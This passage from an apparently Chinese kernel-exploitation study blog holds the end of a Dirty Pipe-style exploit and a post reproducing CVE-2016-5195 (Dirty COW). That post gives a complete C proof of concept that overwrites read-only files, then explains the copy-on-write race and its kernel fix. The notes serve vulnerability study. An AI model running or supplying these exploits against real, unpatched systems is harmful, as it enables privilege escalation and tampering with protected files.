offset_in_file--;   <span class="comment">// we read a byte, so offset should minus 1</span></span><br><span class="line">    retval = splice(target_file_fd, &amp;offset_in_file, pipe_fd[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;splice failed!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (retval == <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;short splice!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] File splice done.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Now it comes to the time of exploit:</span></span><br><span class="line"><span class="comment">     * the mapped page of file has been in pipe_buffer,</span></span><br><span class="line"><span class="comment">     * and the PIPE_BUF_FLAG_CAN_MERGE is still set,</span></span><br><span class="line"><span class="comment">     * just a simple write can make the exploit.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    retval = write(pipe_fd[<span class="number">1</span>], argv[<span class="number">3</span>], data_size);</span><br><span class="line">    <span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Write failed!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (retval &lt; data_size)</span><br><span class="line">        errExit(<span class="string">&quot;Short write!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] EXPLOIT DONE!\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/02/21/CVE-2016-5195%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/02/21/CVE-2016-5195%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">CVE-2016-5195复现记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-02-21 20:16:37" itemprop="dateCreated datePublished" datetime="2024-02-21T20:16:37+08:00">2024-02-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-03 10:51:00" itemprop="dateModified" datetime="2024-03-03T10:51:00+08:00">2024-03-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kernel-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">kernel pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>7.7k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Dirty COW脏牛漏洞是一个非常有名的Linux竞争条件漏洞，虽然早在2016年就已经被修复，但它依然影响着众多古老版本的Linux发行版，如果需要了解Linux的COW，依然非常值得学习。</p>
<p>漏洞：CVE-2016-5195<br />
影响Linux版本：&gt;2.6.22, &lt;4.8.3 / 4.7.9 / 4.4.26<br />
漏洞类型：竞争条件<br />
使用Linux样本：4.8.2</p>
<p>注意：4.8.2版本较低，如果使用较高版本的gcc编译，可能会产生一些难以解决的问题，如一直重启等，这里使用的是Ubuntu 16.04中的gcc完成编译，在22.04的qemu中可以正常运行。</p>
<h1 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> poc</h1>
<p>poc来源：<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/#0x02-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">资料</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">dst_st</span>, <span class="title">fk_st</span>;</span></span><br><span class="line"><span class="type">void</span> * <span class="built_in">map</span>;</span><br><span class="line"><span class="type">char</span> *fake_content;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;usage: ./poc destination_file fake_file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> write_thread, madvise_thread;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dst_fd, fk_fd;</span><br><span class="line">    dst_fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">    fk_fd = open(argv[<span class="number">2</span>], O_RDONLY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of dst: %d\nfd of fk: %d\n&quot;</span>, dst_fd, fk_fd);</span><br><span class="line"></span><br><span class="line">    fstat(dst_fd, &amp;dst_st); <span class="comment">// get destination file length</span></span><br><span class="line">    fstat(fk_fd, &amp;fk_st); <span class="comment">// get fake file length</span></span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, dst_st.st_size, PROT_READ, MAP_PRIVATE, dst_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    fake_content = <span class="built_in">malloc</span>(fk_st.st_size);</span><br><span class="line">    read(fk_fd, fake_content, fk_st.st_size);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;madvise_thread, <span class="literal">NULL</span>, madviseThread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;write_thread, <span class="literal">NULL</span>, writeThread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_join(madvise_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(write_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> mm_fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of mem: %d\n&quot;</span>, mm_fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        lseek(mm_fd, (<span class="type">off_t</span>) <span class="built_in">map</span>, SEEK_SET);</span><br><span class="line">        write(mm_fd, fake_content, fk_st.st_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100000</span>; i++)&#123;</span><br><span class="line">        madvise(<span class="built_in">map</span>, <span class="number">0x100</span>, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单解释一下，这个程序需要两个参数，第一个参数是需要被修改的只读文件，第二个参数是可读的其他文件。执行后第一个文件中的内容将会被改写为第二个文件的内容。程序会通过mmap系统调用将第一个文件映射到内存空间，随后创建两个线程，一个线程循环通过write打开当前进程的mem虚拟文件对映射的内存进行写操作，一个线程循环调用madvise系统调用提示内核：这块映射的内存空间不再需要。这样，这块映射内存会在某个时刻被内核释放掉。</p>
<p>那么这个漏洞的原理是什么呢？简单看看上面的参考博客，发现要理解起来还是有一定难度的。</p>
<h1 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h1>
<h2 id="页表与缺页异常"><a class="markdownIt-Anchor" href="#页表与缺页异常"></a> 页表与缺页异常</h2>
<p>在操作系统这门课中我们学到，现代操作系统对于内存地址有一定的处理。内存被分为若干页，<strong>在进程中被处理的内存页均为虚拟内存页，其地址与物理内存页不同，因此需要有一个物理页和虚拟页的映射表</strong>。这个映射表由内存管理单元MMU管理，每一个进程都有一个映射表。</p>
<p>对于现代操作系统，页表一般是多级的，这样做的好处是可以节省内存空间，并降低页表内存空间的连续性。什么意思呢？假如页表只有一级，对于一个64位地址，最低12位作为页内偏移，那么高52位都将作为页表的索引地址。<strong>为了效率考虑，MMU只能使用数组进行索引</strong>，那么这样的话就会有2<sup>52</sup>个页表项，而其中绝大部分都是空的，会大大浪费内存空间，且这块空间是连续的。而如果使用二级页表，中间12位为二级页表索引，最高40位为一级页表索引，这样理论上只有2<sup>40</sup>个一级页表项，它们连续存储的空间消耗大大小于只使用一级页表的情况（虽然还是很大）。<strong>而当一个一级页表对应的地址范围都无效时，内存中完全可以不保存它所对应的二级页表，将二级页表的物理地址设置为0表示无效即可，这样大大节省了空间。否则，一级页表项保存其下的二级页表地址</strong>。</p>
<p>目前主流x86 Linux系统使用4级（多数）或5级页表，对于4级页表，索引64位虚拟地址空间时，假设最低12位作为页内偏移，每一级页表项负责13位（实际不是这样安排的），即一个一级页表项下面有2<sup>13</sup>个二级页表项，一个二级页表项下面有2<sup>13</sup>个三级页表项，以此类推。那么这样一共就会有2<sup>13</sup>个一级页表。假设一个进程只有一个有效的虚拟内存页，那么四级页表系统只需要保存：2<sup>13</sup>个一级页表项（其中只有有效虚拟内存页对应的一级页表项具有有效的二级页表地址）、2<sup>13</sup>个二级页表项（其中只有有效虚拟内存页对应的二级页表项具有有效的三级页表地址）、2<sup>13</sup>个三级页表项（…）、2<sup>13</sup>个四级页表项（…），共2<sup>15</sup>个页表项，如果一个页表项的大小为0x10字节，那么一共就只有320KB用来保存页表项，对于现在的内存来说完全够用。</p>
<p>由上面的分析可知，映射表中通常只会保存很少的页表项PTE（Page Table Entry），页表的级数越多，映射访问需要访存的次数越多，效率越低。为此，人们为现代OS提供了TLB进行访存提速，它相当于一个能够动态记录页表项且并行查找的硬件，这不是本文的重点，略过。</p>
<p>如果CPU访问了一个虚拟地址，而这个虚拟地址不存在于任何一个PTE中，或者进行的访问操作（读或写）在这个页中没有权限进行，那么MMU会向OS报<strong>缺页异常</strong>。</p>
<p>缺页异常一共分为3类：硬缺页、软缺页以及无效缺页。前两种都是有效的缺页，可以被合理处理；而后面一种是真正的异常，会导致进程立即中止。这三种异常到底什么意思呢？</p>
<ul>
<li>硬缺页异常：物理内存没有对应的页帧。什么意思？比如你的笔记本内存不够，你设置了磁盘的内存交换，让OS在物理内存不足时将暂时没有使用的内存内容移动到磁盘中，空余出内存存放其他的重要数据。这样，原来的内存数据就暂时不在内存之中，即没有对应的页帧。此类异常的处理通常需要较大开销。（实际上的可能场景有三种，具体内容详见<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/673410655">资料</a>，很详细很长但是非常复杂，在此%一下作者，这是真大佬，没见过对内核内存管理理解这么透彻的）</li>
<li>软缺页异常：物理内存有对应页帧。这类大多是发生在写时复制COW时，当父进程fork出一个子进程后，子进程需要对内存空间进行修改，那么OS就需要将父进程的部分内存复制一份，随后将这个新的页填入到子进程页表的对应位置。</li>
<li>无效缺页异常：要访问的虚拟内存地址原本就是无效的，本来就不应该有物理内存映射。此类问题会报段错误并中止进程。</li>
</ul>
<h2 id="procselfmem的写入流程"><a class="markdownIt-Anchor" href="#procselfmem的写入流程"></a> /proc/self/mem的写入流程</h2>
<p>（下面的函数名前面加@的带链接可跳转查看）</p>
<p>这是一个/proc目录下的特殊文件，/proc/self表示当前进程，而mem则作为一个虚拟文件，表示当前进程的内存空间。</p>
<p>我们都知道，当用户程序通过open函数打开一个文件时，内核会为用户程序返回一个文件描述符，用户程序后续可通过这个文件描述符整数对文件进行操作。为了将文件操作与不同文件（普通文件、进程文件、设备文件等）解耦合，Linux设计了一个<code>file_operations</code>结构体，对文件描述符进行读、写等操作时，在内核中实际上是在执行<code>file_operations</code>中的读写函数。</p>
<p>而对于/proc目录下表示内存的文件，Linux内核定义了属于这些文件的<code>file_operations</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">proc_mem_operations</span> =</span> &#123;</span><br><span class="line">	.llseek		= mem_lseek,</span><br><span class="line">	.read		= mem_read,</span><br><span class="line">	.write		= mem_write,</span><br><span class="line">	.open		= mem_open,</span><br><span class="line">	.release	= mem_release,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>也即打开/proc/self/mem后，我们调用<code>write</code>函数实际上在内核调用的是<code>mem_write</code>。通过查看源码发现，它实际上调用的是@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/fs/proc/base.c#L845"><code>mem_rw</code></a>：</p>
<ul>
<li>内核首先会通过<code>__get_free_page</code>获得一个临时的空闲内存页</li>
<li>使用<code>copy_from_user</code>将当前进程的内存数据复制到临时页。</li>
<li>调用<code>access_remote_vm</code>对临时内存进行访问，完成读写操作。</li>
</ul>
<p>而对于<code>access_remote_vm</code>（全部逻辑在@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/mm/memory.c#L3854"><code>__access_remote_vm</code></a>），主要操作包括：</p>
<ul>
<li>调用<code>down_read</code>为内存上读锁。</li>
<li>进入循环：
<ul>
<li>调用<code>get_user_pages_remote</code>函数，获取要读或写的内存页的物理地址。</li>
<li>如果内存页获取失败，进行其他处理。</li>
<li>内存页获取成功后，每一次以一页为单位进行读或写操作，首先计算要操作的内存大小，随后调用<code>kmap</code>将要操作的内存映射到一个内核内存页中。</li>
<li>如果操作为写，则调用<code>copy_to_user_page</code>向映射的内存页写入数据，并设置内存页为脏页（<code>set_page_dirty_lock</code>）</li>
<li>调用<code>kunmap</code>解除映射，并删除cache中的对应项。</li>
</ul>
</li>
<li>调用<code>up_read</code>为内存解锁读锁。</li>
</ul>
<p>那么这里面的重点就在于<code>get_user_pages_remote</code>，它是如何获取物理地址的。调用链为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get_user_pages_remote</span><br><span class="line">  __get_user_pages_locked</span><br><span class="line">    __get_user_pages</span><br></pre></td></tr></table></figure>
<p>主要逻辑都在后面两个函数中。首先看到@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/mm/gup.c#L728"><code>__get_user_pages_locked</code></a>。这个函数中有一个大循环，其中调用了两次@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/mm/gup.c#L519"><code>__get_user_pages</code></a>，这个函数内部的逻辑大概为：</p>
<ul>
<li>定义一个<code>vm_area_struct</code>实例<code>vma</code>初始化为空。<code>vma</code>表示虚拟内存区域，通常与一页或多页相关联。</li>
<li>一个大循环。
<ul>
<li>如果<code>vma</code>为空或要获取的地址超过了<code>vma</code>的范围：
<ul>
<li>调用<code>find_extend_vma</code>函数获取<code>vma</code>。</li>
<li>进行其他的处理，完成后返回或继续进行下一页处理。</li>
</ul>
</li>
<li>调用<code>follow_page_mask</code>获取给定虚拟地址对应的物理页。</li>
<li>如果没有获取到，可能原因是对应物理页不存在或没有写权限：
<ul>
<li>调用<code>faultin_page</code>进行缺页异常处理。</li>
<li>如果处理成功则重试，跳转到调用<code>follow_page_mask</code>之前；否则返回或处理下一页。</li>
</ul>
</li>
<li>否则如果页表不存在，则处理下一页。</li>
<li>否则如果返回错误值，立即返回。</li>
<li>进行页面的其他处理，刷新计数器。</li>
</ul>
</li>
</ul>
<p>下面看到@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/mm/gup.c#L354"><code>faultin_page</code></a>。这个函数里涉及大量针对flags参数的判断与修改，根据源码分析发现，传入这个函数的flags参数为<code>FOLL_TOUCH | FOLL_REMOTE | FOLL_GET | FOLL_WRITE | FOLL_FORCE</code>：</p>
<ul>
<li>进行一系列判断与变量修改。</li>
<li>调用<code>handle_mm_fault</code>处理缺页异常，分配有效物理内存页。</li>
<li>根据<code>handle_mm_fault</code>函数返回值进行其他处理。</li>
<li>如果需要写且有写权限，则去除<code>flags</code>中的<code>FOLL_WRITE</code>标志位。</li>
</ul>
<p>在@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/mm/memory.c#L3619"><code>handle_mm_fault</code></a>中，首先检查虚拟内存的权限，如果发现虚拟内存无效会给出SIGSEGV信号并返回。主要逻辑在@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/mm/memory.c#L3566"><code>__handle_mm_fault</code></a>中。</p>
<p>在<code>__handle_mm_fault</code>中，将会从一级页表PGD依次向下获取页目录，若分配失败，表示内存不足，会返回<code>VM_FAULT_OOM</code>。中间经过一系列处理后调用@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/mm/memory.c#L3478"><code>handle_pte_fault</code></a>继续进行处理。</p>
<p>在<code>handle_pte_fault</code>中，由于上一级函数已经创建PMD三级页目录项，因此会进入第一个if语句将<code>fe-&gt;pte</code>设置为空，由此进入第二个if语句。根据代码分析可知，目前分析的调用链所处理的<code>vma</code>不是匿名<code>vma</code>，因此会调用@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/mm/memory.c#L3313"><code>do_fault</code></a>处理后直接返回，下面的代码不会执行。</p>
<p>在<code>do_fault</code>中，由于我们处理的是写的异常，因此会跳过前两个判断，进入第三个if语句调用@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/mm/memory.c#L3200"><code>do_cow_fault</code></a>，即处理写时复制所导致的缺页异常。</p>
<p>在<code>do_cow_fault</code>中：</p>
<ul>
<li>调用了<code>alloc_page_vma</code>函数分配一个新的内存页。</li>
<li>调用<code>__do_fault</code>处理异常。</li>
<li>调用<code>alloc_set_pte</code>函数将新分配的内存页更新到PTE中。</li>
</ul>
<p>到这里，<code>__get_user_pages</code>函数就成功调入了这个内存页，并将其地址存放到了页表项中。随后会通过<code>goto retry</code>再一次调用<code>follow_page_mask</code>。在第二次调用中，由于内核能够找到相应的页表项，因此在<code>handle_pte_fault</code>中会执行后面的代码。后面由于需要进行写操作，因此会调用<code>pte_write</code>函数判断页面是否可写，这里显然是不可写。这样就会调用@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/mm/memory.c#L2359"><code>do_wp_page</code></a>并返回。</p>
<p>在<code>do_wp_page</code>中，由于页面本身不可写，因此不能对页面进行共享，而是只能进行复制（使用<code>wp_page_copy</code>），而复制后的内存页只属于需要进行COW的进程，因此<code>faultin_page</code>会给予写权限，本次调用成功返回。随后<code>follow_page_mask</code>第三次来到retry标号处，随后就可以使用<code>follow_page_mask</code>成功获取一个符合权限的存在的内存页，COW流程结束。</p>
<h2 id="madvise"><a class="markdownIt-Anchor" href="#madvise"></a> madvise</h2>
<p>madvise的一种易懂的理解是，我们用户给内核有关于某一段内存的使用建议，告诉内核应该如何使用某一段内存。建议分为多种，下面是Linux源码中的注释：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The madvise(2) system call.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Applications can use madvise() to advise the kernel how it should</span></span><br><span class="line"><span class="comment"> * handle paging I/O in this VM area.  The idea is to help the kernel</span></span><br><span class="line"><span class="comment"> * use appropriate read-ahead and caching techniques.  The information</span></span><br><span class="line"><span class="comment"> * provided is advisory only, and can be safely disregarded by the</span></span><br><span class="line"><span class="comment"> * kernel without affecting the correct operation of the application.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * behavior values:</span></span><br><span class="line"><span class="comment"> *  ...</span></span><br><span class="line"><span class="comment"> *  MADV_DONTNEED - the application is finished with the given range,</span></span><br><span class="line"><span class="comment"> *		so the kernel can free resources associated with it.</span></span><br><span class="line"><span class="comment"> *  ...</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<p>这里我们只关注<code>MADV_DONTNEED</code>这个选项，它表示应用程序已经不再需要这段内存，可以让内核调出这些内存页。注意调出不是释放，而是暂时不用。</p>
<h1 id="漏洞点"><a class="markdownIt-Anchor" href="#漏洞点"></a> 漏洞点</h1>
<p>上面的分析中，尤其是COW的流程难以理解，需要细细咀嚼。</p>
<p>而这个著名CVE到底是如何产生的呢？</p>
<p>需要注意的是，我们进行映射的那个文件原本是不可写的，打开的时候也没有尝试获取写权限，但问题是，我们可以直接访问当前进程的内存空间虚拟文件/proc/self/mem，而这个文件是具有写权限的。</p>
<p>这就造成了一个问题：我通过打开这个虚拟文件对那块不可写的内存空间强行写入会怎样？这个问题我们在上面的分析中已经得到了答案——内核会通过COW机制让本次写操作写入的是那块映射内存空间的复制页，如果我们不同时使用madvise竞争，写入操作不会直接对映射内存写入。这样即满足了映射空间不可写的权限，也满足了写入的要求。</p>
<p>但现在，我们使用了madvise系统调用。如果我们在第二次调用<code>follow_page_mask</code>之后让madvise将本来分配到的内存页又给调出去了，这样的话第三次调用<code>follow_page_mask</code>就不能正常获取内存页，但此时保存页面权限的变量<code>foll_flags</code>已经添加了可写权限。因此<code>follow_page_mask</code>第三次调用会将原来的文件的只读映射副本重新调入（因为此时<code>foll_flags</code>已经添加了写权限，内核误以为原本映射的内存页可写），这就造成了条件竞争漏洞，最终在第四次调用<code>follow_page_mask</code>时获取到原来的只读副本并且能够成功写入。</p>
<p><img src="1.png" alt="" /></p>
<h1 id="修复"><a class="markdownIt-Anchor" href="#修复"></a> 修复</h1>
<p>经过了一番分析之后，我们总算是理解了这个著名漏洞的成因，即权限变量与内存页分离不同时存在导致可能产生条件竞争。那么要想修复这个问题，最为简单的方法就是将二者进行绑定，不使用临时变量判断页面的权限，而是直接将页面权限字段加入到内存页实例中，这样，即使madvise成功调出了原先只读的物理页，<code>follow_page_mask</code>获取到的也依然是只读的物理页。</p>
<p>从ChangeLog可知，Linus Torvalds解决这个问题的方式比上面的方式更简单，他添加了一个<code>FOLL_COW</code>常量，专门用来处理COW流程，当要写入的内存页成功申请后，为变量添加<code>FOLL_COW</code>而不是<code>FOLL_WRITE</code>，将二者区分开来，这样不必修改表示内存页的结构体本身。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/02/07/Kernel-pwn-%E5%85%A5%E9%97%A8-9/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/02/07/Kernel-pwn-%E5%85%A5%E9%97%A8-9/" class="post-title-link" itemprop="url">Kernel pwn 入门 (9)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-02-07 11:25:46" itemprop="dateCreated datePublished" datetime="2024-02-07T11:25:46+08:00">2024-02-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-02-08 11:30:17" itemprop="dateModified" datetime="2024-02-08T11:30:17+08:00">2024-02-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
